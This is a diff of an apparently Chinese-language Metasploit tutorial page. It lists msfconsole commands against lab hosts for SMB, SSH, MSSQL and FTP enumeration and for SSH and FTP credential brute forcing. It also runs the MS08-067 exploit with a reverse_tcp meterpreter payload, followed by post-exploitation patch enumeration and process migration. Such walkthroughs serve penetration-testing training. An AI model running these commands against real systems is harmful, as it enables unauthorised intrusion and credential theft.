+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>SMB 用户枚举（账号、密码）</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
-msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>SID 枚举（账号、密码）</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
 <li>SSH 版本扫描<ul>
 <li>use auxiliary/scanner/ssh/ssh_version</li>
 </ul>
@@ -1243,24 +822,19 @@ msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"
 </li>
 <li>SSH 版本扫描</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
-msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_version) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>SSH 密码爆破</li>
 </ul>
-<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set USERPASS_FILE</span> /usr/<span class="comment">share</span>/metasploit-framework/<span class="comment">data</span>/wordlists/<span class="comment">root_userpass.txt</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set VERBOSE false</span> </span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-msf &gt; use auxiliary/scanner/ssh/ssh_login
-msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
-msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
-msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
+<ul>
 <li>SSH 公钥登陆</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set USERNAME root</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
 <li><p>基于已经取得的 session 进行检测</p>
 </li>
 <li><p>use post/windows/gather/enum_patches</p>
@@ -1278,22 +852,18 @@ msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</
 <li><p>ms08-067</p>
 </li>
 </ul>
-<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
-msf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.147
-msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
-msf exploit(windows/smb/ms08_067_netapi) &gt; run</code></pre><p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p>
-<pre><code>meterpreter &gt; backgroun
-msf exploit(windows/smb/ms08_067_netapi) &gt; sessions </code></pre><p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p>
-<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/enum_patches
-msf post(windows/gather/enum_patches) &gt; set SESSION 4
-msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p>
-<pre><code># 进程错误，迁移进程
-msf post(windows/gather/enum_patches) &gt; sessions -i 4
-meterpreter &gt; getpid
-meterpreter &gt; ps
-meterpreter &gt; migrate 828  # spoolsv.exe
-meterpreter &gt; background 
-msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; backgroun</span><br><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; sessions</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; set SESSION <span class="number">4</span></span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程错误，迁移进程</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; sessions -i 4</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 828  # spoolsv.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p>
 <h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
 <li><p>mssql 扫描端口</p>
 <ul>
@@ -1315,9 +885,9 @@ msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://
 <li><p>mssql扫描端口</p>
 </li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping
-msf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142
-msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf auxiliary(scanner/mssql/mssql_ping) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.142</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/mssql/<span class="comment">mssql_ping) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul>
 <li><p>ftp 版本扫描</p>
 <ul>
 <li>use auxiliary/scanner/ftp/ftp_version</li>
@@ -1332,19 +902,33 @@ msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描">
 <li><p>查询版本信息</p>
 </li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_version
-msf (scanner/ftp/ftp_version) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf (scanner/ftp/ftp_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">ftp_version) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p>
 <ul>
 <li><p>是否允许匿名登录</p>
-<pre><code>msf &gt; use auxiliary/scanner/ftp/anonymous
-msf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre></li>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">anonymous) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p>
 <ul>
 <li><p>暴力破解</p>
-<pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">ftp</span>/ftp_login</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</li>
 </ul>
 
       
